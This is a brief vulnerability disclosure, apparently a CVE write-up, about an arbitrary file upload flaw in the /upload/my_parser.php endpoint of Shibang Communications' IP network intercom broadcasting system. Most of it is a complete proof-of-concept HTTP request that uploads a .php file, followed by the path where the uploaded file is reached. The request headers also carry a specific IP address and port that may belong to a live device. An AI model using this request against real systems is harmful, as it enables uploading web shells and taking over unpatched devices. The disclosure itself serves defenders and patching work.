There is an arbitrary file upload vulnerability in the IP network intercom broadcasting system of Shibang Communications Co., Ltd.

1. Impact of vulnerabilities
IP network intercom broadcasting system

2. Vulnerability location
/upload/my_parser.php

3.Vulnerability recurrence

![image](https://github.com/garboa/cve_3/assets/22628693/40d44c9d-d7e6-4425-baa6-adfd61e62ef6)


Upload any file to the server through the following POC
POC
```
POST /upload/my_parser.php HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------316190348235048577772059862095
Content-Length: 239
Origin: http://219.128.48.234:4080
Connection: close
Referer: http://219.128.48.234:4080/html/system.html
X-Forwarded-For: 1.1.1.1

-----------------------------316190348235048577772059862095
Content-Disposition: form-data; name="upload"; filename="123.php"
Content-Type: application/octet-stream

1233
-----------------------------316190348235048577772059862095--

```

![image](https://github.com/garboa/cve_3/assets/22628693/2d84be88-1797-470d-be66-ea6861db34e6)

visit /upload/files/123.php

![image](https://github.com/garboa/cve_3/assets/22628693/b6719180-1589-4800-8bd0-719406e6ff5b)

